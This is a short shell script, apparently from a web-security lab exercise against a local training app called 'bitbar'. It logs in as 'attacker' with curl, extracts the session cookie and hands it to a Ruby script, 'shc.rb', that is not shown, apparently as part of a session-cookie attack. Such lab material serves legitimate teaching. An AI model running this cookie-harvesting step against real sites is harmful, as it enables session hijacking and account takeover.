curl -s -o /dev/null -c cookie.txt -d "username=attacker&password=attacker" "http://localhost:3000/post_login"
cookie=`cat cookie.txt | grep bitbar | cut -f 7`
ruby shc.rb $cookie
